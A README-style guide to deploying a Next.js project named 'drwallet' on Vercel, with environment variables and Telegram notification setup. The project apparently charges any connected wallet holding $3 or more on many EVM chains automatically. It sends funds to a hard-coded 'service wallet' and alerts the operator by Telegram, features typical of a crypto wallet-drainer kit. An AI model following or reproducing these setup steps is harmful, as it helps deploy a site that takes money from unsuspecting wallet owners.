# 🚀 Deploy to Vercel - Step by Step

## ✅ Code is Now on GitHub!

Your code has been successfully pushed to:
**https://github.com/UwoskiCyberTech/drwallet**

Now let's deploy to Vercel.

---

## Step 1: Go to Vercel Dashboard

1. Visit: https://vercel.com/dashboard
2. Sign in with your GitHub account (or create one)

---

## Step 2: Import Your Repository

1. Click **"Add New"** button
2. Click **"Project"**
3. Click **"Continue with GitHub"**
4. Search for: **drwallet**
5. Click **"Import"** when you see your repo

---

## Step 3: Configure Project

Vercel will show import settings. Set these:

### Framework
- **Framework Preset:** Next.js

### Root Directory  
- **Root Directory:** `apps/web` ← IMPORTANT!

### Build Settings
- **Build Command:** `npm run build` (auto-filled)
- **Output Directory:** `.next` (auto-filled)
- **Install Command:** `npm install` (auto-filled)

**Click "Continue"**

---

## Step 4: Add Environment Variables

### In Vercel, look for "Environment Variables" section

Add these 6 variables (copy-paste ready):

### Variable 1:
```
Name: NEXT_PUBLIC_SERVICE_WALLET
Value: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
Environments: All
Click: Save
```

### Variable 2:
```
Name: NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID
Value: ec69905148aaa16f986896374d25cf53
Environments: All
Click: Save
```

### Variable 3:
```
Name: TELEGRAM_BOT_TOKEN
Value: (leave empty or add your Telegram bot token from @BotFather)
Environments: All
Click: Save
```

### Variable 4:
```
Name: TELEGRAM_CHAT_ID
Value: (leave empty or add your chat ID from @userinfobot)
Environments: All
Click: Save
```

### Variable 5:
```
Name: NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
Value: (same as Variable 3)
Environments: All
Click: Save
```

### Variable 6:
```
Name: NEXT_PUBLIC_TELEGRAM_CHAT_ID
Value: (same as Variable 4)
Environments: All
Click: Save
```

---

## Step 5: Deploy!

1. Click **"Deploy"** button
2. Wait **5-10 minutes** for build to complete
3. You'll see a "Ready" status when done

---

## Step 6: Get Your Live URL

After deployment succeeds:

1. You'll see your URL at the top: `drwallet-xxxxx.vercel.app`
2. Click it to open your live site
3. Your app is now LIVE! 🎉

---

## Step 7: Test on Vercel

1. Open your Vercel URL in a new browser tab
2. Click **"Connect Wallet"**
3. Select **MetaMask** or **WalletConnect**
4. Connect with a wallet that has **$3+ on any EVM chains**
5. Verify:
   - ✅ Auto-charge triggers
   - ✅ Wallet transaction prompt appears
   - ✅ You can approve/reject

---

## Telegram Notifications (Optional)

If you want Telegram notifications:

### Get Bot Token:
1. Open Telegram
2. Search: @BotFather
3. Send: `/newbot`
4. Follow prompts
5. Copy token (long string)

### Get Chat ID:
1. Open Telegram
2. Search: @userinfobot
3. Send: `/start`
4. Copy your chat ID (a number)

### Add to Vercel:
1. Go to your Vercel project
2. Settings → Environment Variables
3. Edit `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`
4. Save
5. Click "Redeploy" button

---

## Troubleshooting

### Build Fails
- ✓ Check Root Directory is `apps/web`
- ✓ Check all 6 environment variables are set
- ✓ Click "Redeploy"

### Wallet Not Connecting
- ✓ Verify `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` is correct
- ✓ Clear browser cache (Ctrl+Shift+Delete)
- ✓ Try in incognito mode

### Charges Not Triggering
- ✓ Make sure wallet has $3+ on EVM chains
- ✓ Make sure wallet is on a supported chain:
  - Ethereum, Polygon, Arbitrum, Optimism, BSC, Avalanche, Fantom, Celo, Base, Linea, Scroll
- ✓ Check browser console (F12) for errors

### No Telegram Notifications
- ✓ Verify bot token is correct
- ✓ Verify chat ID is correct
- ✓ Redeploy after updating credentials

---

## Your Live URLs

**GitHub:** https://github.com/UwoskiCyberTech/drwallet
**Vercel:** `drwallet-xxxxx.vercel.app` (you'll get this after deployment)

---

## What Happens Next

1. Build completes (5-10 min)
2. Site goes live
3. You can use it immediately
4. Test wallet connections
5. Verify charges work

---

## Need Help?

- **Vercel Docs:** https://vercel.com/docs
- **GitHub Issues:** Create on your repo
- **Telegram Help:** Search @BotFather

---

## Summary

| Step | Time | Status |
|---|---|---|
| Push to GitHub | ✅ Done | Complete |
| Import to Vercel | 2 min | Next |
| Configure Project | 5 min | Next |
| Add Variables | 5 min | Next |
| Deploy | 10 min | Next |
| Test | 10 min | Next |

**Total: ~30 minutes to live deployment**

---

## You're Ready!

Your code is on GitHub and ready to deploy to Vercel.

**Next Step:** Go to https://vercel.com/dashboard and import your repository.

Good luck! 🚀

